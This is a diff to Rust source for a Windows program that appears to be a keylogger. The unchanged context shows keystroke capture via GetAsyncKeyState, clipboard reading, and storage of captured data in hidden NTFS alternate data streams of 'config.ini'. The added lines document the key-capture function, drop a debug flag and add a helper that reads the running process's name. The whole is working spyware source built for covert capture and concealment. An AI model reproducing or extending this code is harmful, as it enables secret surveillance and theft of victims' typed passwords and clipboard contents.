@@ -5,12 +5,14 @@ use winapi::um::minwinbase::{SYSTEMTIME, LPSYSTEMTIME};
 use clipboard_win::{Clipboard, Getter, formats};
 use winapi::um::fileapi::{SetFileAttributesW};
 use widestring::*;
+use winapi::um::libloaderapi::{GetModuleHandleW, GetModuleFileNameW};
+use winapi::shared::minwindef::{HMODULE};
+use std::ptr;
 
 pub static RELEASE_BUFFER: u32 = 60000;
 pub static KEY_FILENAME: &str = "config.ini:kdata.dat";
 pub static CLIP_FILENAME: &str = "config.ini:cpdata.dat";
 pub const BASE_FILENAME: &str = "config.ini";
-pub static DBG: bool = false;
 
 #[derive(Debug, Copy, Clone)]
 #[allow(dead_code)]
@@ -262,6 +264,11 @@ impl KbKeys {
   }
 }
 
+/**Function returns the character key that was pressed down.
+ * Params:
+ *  key {The key codes used to detect each key press}.
+ * Returns &str
+ */
 pub fn get_key_press(key: KbKeys) -> &'static str {
   unsafe {
     if GetAsyncKeyState(key.lctrl) < 0 || GetAsyncKeyState(key.lctrl) < 0 {
@@ -448,4 +455,38 @@ pub fn set_file_hidden(hidden: bool) -> () {
   unsafe {
     SetFileAttributesW(u16_filename.as_ptr(), option);
   }
-} // set_file_hidden
+}
+
+/**Function gets the name fo the running process.
+ * Params:
+ *  None.
+ * Returns String.
+ */
+#[allow(unused_assignments)]
+pub fn get_module_name() -> String {
+  let mut hmod: HMODULE = ptr::null_mut();                // Creates a mutable windows handle.
+  let mut buffer: [u16; 260] = [0; 260];                  // The static buffer to hold the module path.
+
+  unsafe {
+    hmod = GetModuleHandleW(ptr::null());
+    GetModuleFileNameW(
+      hmod, buffer.as_mut_ptr(), 260
+    );
+  }
+
+  let mut buffer_string = "".to_owned();          // Convert the u16 array to a String.
+  match String::from_utf16(&buffer) {
+    Ok(s) => { buffer_string = s; },
+    
+    Err(e) => {
+      eprintln!("Failed to convert u16 array to String {}", e);
+    }
+  }
+
+  // Grab the name of the running process.
+  let slice_array: Vec<&str> = buffer_string.split("\\").collect();
+  let mod_slice = slice_array[slice_array.len()-1];
+  let output = mod_slice.replace("\0", "");
+
+  output
+}
